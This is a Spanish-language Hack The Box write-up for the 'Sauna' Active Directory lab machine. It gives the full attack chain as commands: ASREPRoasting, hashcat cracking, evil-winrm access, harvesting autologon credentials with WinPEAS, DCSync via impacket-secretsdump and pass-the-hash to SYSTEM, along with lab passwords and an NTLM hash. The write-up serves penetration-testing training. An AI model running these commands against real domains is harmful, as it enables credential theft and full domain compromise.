[🧖 Sauna — HTB [Windows · Easy · AD] 36c15bd2d16c8153a33de00fe7f7f6d9.md](https://github.com/user-attachments/files/28308710/Sauna.HTB.Windows.Easy.AD.36c15bd2d16c8153a33de00fe7f7f6d9.md)
# 🧖 Sauna — HTB [Windows · Easy · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.29.118` / `10.129.31.5` |
| Dominio | `EGOTISTICAL-BANK.LOCAL` |
| Vector inicial | Web scraping → usernames → ASREPRoasting |
| Usuario inicial | `fsmith` : `Thestrokes23` |
| Pivote | `svc_loanmgr` : `Moneymakestheworldgoround!` (WinPEAS autologon) |
| Escalada | DCSync directo — svc_loanmgr tiene GetChangesAll sobre el dominio |
| Root | `nt authority\system` vía impacket-psexec con hash NTLM Administrator |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Perfil de DC con HTTP en 80 — eso es inusual y merece atención. El resto es el stack clásico: Kerberos, LDAP, SMB, WinRM. Con 5985 abierto el objetivo está claro si conseguimos credenciales.

```bash
nmap -sS -p- --min-rate 5000 10.129.29.118
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image.png)
> 

## Nmap — versiones y scripts

El HTTP title revela el nombre del objetivo: **Egotistical Bank**. El dominio es `EGOTISTICAL-BANK.LOCAL`. Windows Server 2019. SMB signing requerido.

```bash
nmap -sV -sC -p 53,80,88,135,139,389,445,636,3268,5985 10.129.29.118
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image1.png)
> 

---

# 2. Enumeración — Web scraping y generación de usernames

Con HTTP abierto vamos a la web. La página del banco tiene una sección "Meet The Team" con los nombres completos del equipo. Sin acceso anónimo a SMB ni RPC, esto es lo que tenemos para construir una lista de usuarios.

Nombres encontrados en la web:

- Fergus Smith
- Shaun Coins
- Bowie Taylor
- Hugo Bear
- Sophie Driver
- Steven Kerb

Generamos variaciones típicas de usernames corporativos (formato inicial+apellido, nombre.apellido, etc.):

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image2.png)
> 

---

# 3. Explotación — ASREPRoasting

Con la lista de posibles usuarios probamos ASREPRoasting. Sin credenciales, impacket-GetNPUsers intenta obtener AS-REP de cada usuario que tenga `DONT_REQ_PREAUTH` activo.

```bash
impacket-GetNPUsers egotistical-bank.local/ -dc-ip 10.129.29.118 \
  -usersfile users.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image3.png)
> 

Crackeamos con hashcat modo 18200:

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image4.png)
> 

---

# 4. Acceso inicial — evil-winrm como fsmith

```bash
evil-winrm -i 10.129.29.118 -u fsmith -p 'Thestrokes23'
```

Dentro subimos SharpHound y WinPEAS para enumerar vectores de escalada:

```powershell
*Evil-WinRM* PS> upload SharpHound.exe
*Evil-WinRM* PS> .\SharpHound.exe
*Evil-WinRM* PS> upload winPEAS.exe
*Evil-WinRM* PS> .\winPEAS.exe
```

---

# 5. Post-explotación — WinPEAS encuentra credenciales en texto plano

WinPEAS identifica credenciales almacenadas en el registro de autologon de Windows. La clave `HKEY_USERS` tiene guardadas las credenciales de una cuenta de servicio en texto claro.

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image5.png)
> 

Ojo importante: WinPEAS reporta el usuario como `svc_loanmanager` pero el usuario real es `svc_loanmgr` — se puede verificar listando `c:\Users\` desde la sesión de fsmith. Siempre verificar el nombre exacto antes de intentar autenticación.

```powershell
*Evil-WinRM* PS> dir c:\Users
```

---

# 6. Escalada — DCSync con svc_loanmgr

## BloodHound — verificar permisos

Cargamos el zip de SharpHound en BloodHound. El grafo muestra que `svc_loanmgr` tiene directamente los derechos de replicación sobre el dominio: **GetChanges** y **GetChangesAll** — los dos permisos necesarios y suficientes para DCSync.

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image6.png)
> 

No hay que escalar ni modificar ACLs — `svc_loanmgr` ya tiene los permisos de serie. DCSync directo.

## impacket-secretsdump — volcar el dominio

```bash
impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.129.31.5'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image7.png)
> 

## Pass-the-Hash → SYSTEM

```bash
impacket-psexec administrator@10.129.31.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image8.png)
> 

---

# 7. Cadena de ataque

```
Web scraping → nombres del equipo → wordlist de usernames
    ↓
impacket-GetNPUsers → fsmith con DONT_REQ_PREAUTH
    ↓
hashcat -m 18200 → fsmith:Thestrokes23
    ↓
evil-winrm → fsmith → user.txt
    ↓
WinPEAS → autologon registry → svc_loanmgr:Moneymakestheworldgoround!
    ↓
BloodHound → svc_loanmgr tiene GetChanges + GetChangesAll (DCSync directo)
    ↓
impacket-secretsdump → hash NTLM Administrator
    ↓
impacket-psexec -hashes → nt authority\system → root.txt
```

---

# 8. Moralejas

## La web corporativa es una fuente de usernames cuando no hay RPC/SMB

Cuando el entorno no da enumeración anónima por RPC ni SMB, el puerto 80 puede ser la única fuente de información. Una página "Meet The Team" con nombres completos es exactamente lo que necesitas para construir una wordlist de usuarios. El patrón es siempre el mismo: scraping manual → generar variaciones (inicial+apellido, nombre.apellido, etc.) → ASREPRoast o password spray.

## WinPEAS encuentra autologon credentials — siempre revisarlo

Las credenciales almacenadas en autologon (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` o en `HKEY_USERS`) son un hallazgo frecuente en máquinas HTB y en entornos reales mal configurados. WinPEAS las marca claramente. El reflejo es: WinPEAS → buscar la sección de credenciales → probar inmediatamente con evil-winrm o netexec.

## El nombre que reporta WinPEAS puede no ser el nombre exacto

WinPEAS mostró `svc_loanmanager` pero el usuario real era `svc_loanmgr`. Antes de tirar cualquier intento de autenticación, verificar el nombre real: `dir c:\Users` desde la sesión actual te da los nombres exactos de los perfiles. Un carácter de diferencia hace fallar la autenticación y puede generar lockouts.

## Cuando BloodHound muestra DCSync directo, no compliques la cadena

En Forest tuvimos que construir el camino: crear usuario, WriteDACL, Add-ObjectACL. Aquí `svc_loanmgr` ya tenía GetChanges + GetChangesAll de serie — dos comandos y acabado. BloodHound siempre antes de improvisar: si el camino ya está, úsalo.

## El patrón OSCP de esta máquina

```
Web scraping → username enumeration
    ↓
ASREPRoast → cuenta sin pre-auth
    ↓
WinPEAS → credenciales en claro (autologon)
    ↓
BloodHound → DCSync directo
    ↓
Pass-the-Hash → SYSTEM
```

Versión más limpia del patrón de Forest: menos pasos, vector web inicial en lugar de RPC, y el segundo usuario con DCSync ya configurado en lugar de tener que montarlo.

---

# 9. Conceptos técnicos clave

**Autologon credentials:** Windows puede guardar credenciales en el registro para login automático (`DefaultUserName`, `DefaultPassword` en Winlogon). Son accesibles para cualquier usuario con acceso de lectura al registro — WinPEAS las vuelca automáticamente. En entornos reales es un hallazgo crítico.

**GetChanges + GetChangesAll:** Los dos permisos AD necesarios para DCSync. `GetChanges` permite replicar atributos básicos, `GetChangesAll` permite replicar atributos sensibles (hashes de contraseñas). Necesitas ambos. Con solo `GetChanges` el DC responde pero no devuelve los hashes.

**ASREPRoasting sin credenciales:** A diferencia de Kerberoasting (que requiere autenticación), ASREPRoast se puede hacer completamente sin credenciales contra cualquier cuenta que tenga `DONT_REQ_PREAUTH`. impacket-GetNPUsers con una wordlist de usuarios lo automatiza.

---

# 10. Comandos clave

```bash
# Reconocimiento
nmap -sS -p- --min-rate 5000 10.129.29.118
nmap -sV -sC -p 53,80,88,135,139,389,445,636,3268,5985 10.129.29.118

# ASREPRoasting
impacket-GetNPUsers egotistical-bank.local/ -dc-ip 10.129.29.118 \
  -usersfile users.txt
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt

# Acceso inicial
evil-winrm -i 10.129.29.118 -u fsmith -p 'Thestrokes23'

# Enumeración post-explotación
# upload SharpHound.exe → .\SharpHound.exe → download zip → BloodHound
# upload winPEAS.exe → .\winPEAS.exe → buscar sección autologon/credentials

# Verificar nombre real del usuario
dir c:\Users

# DCSync con svc_loanmgr
impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.129.31.5'

# Pass-the-Hash → SYSTEM
impacket-psexec administrator@10.129.31.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e

# Flags
type c:\users\fsmith\desktop\user.txt
type c:\users\administrator\desktop\root.txt
```
